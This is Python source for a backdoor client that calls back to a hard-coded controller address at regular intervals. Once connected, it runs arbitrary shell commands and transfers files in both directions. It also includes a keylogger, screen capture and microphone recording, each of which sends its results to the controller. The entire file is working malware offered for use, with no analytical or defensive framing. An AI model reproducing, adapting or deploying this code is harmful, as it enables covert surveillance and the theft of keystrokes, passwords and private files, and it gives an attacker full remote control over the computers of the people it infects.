# Enhanced Python Backdoor Client
# Features: Keylogger, Screenshot, Audio Recording

import socket
import time
import subprocess
import json
import os
from pynput import keyboard
import threading
from PIL import ImageGrab
import sounddevice as sd
from scipy.io.wavfile import write

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

log = ""
keylogger_running = False
listener = None

# Keylogger functions
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f' [{key}] '

def start_keylogger():
    global listener, keylogger_running
    if not keylogger_running:
        keylogger_running = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

def stop_keylogger():
    global listener, keylogger_running
    if keylogger_running and listener is not None:
        listener.stop()
        keylogger_running = False

# Communication functions
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    with open(file_name, 'rb') as f:
        s.send(f.read())

def download_file(file_name):
    with open(file_name, 'wb') as f:
        s.settimeout(1)
        try:
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        except socket.timeout:
            pass
        s.settimeout(None)

# Command shell loop
def shell():
    global log
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command == 'keylog_start':
            start_keylogger()
            reliable_send("[*] Keylogger started.")
        elif command == 'keylog_stop':
            stop_keylogger()
            reliable_send("[*] Keylogger stopped.")
        elif command == 'keylog_dump':
            reliable_send(log)
            log = ""
        elif command == 'screenshot':
            image = ImageGrab.grab()
            image.save('screen.png')
            upload_file('screen.png')
            os.remove('screen.png')
        elif command == 'record_audio':
            reliable_send("[*] Recording 10 seconds of audio...")
            fs = 44100
            seconds = 10
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write("recording.wav", fs, recording)
            upload_file("recording.wav")
            os.remove("recording.wav")
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            reliable_send(result.decode())

# Connection logic
def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.56.103', 5555))  # Replace with your server IP
            shell()
            s.close()
            break
        except:
            continue

connection()
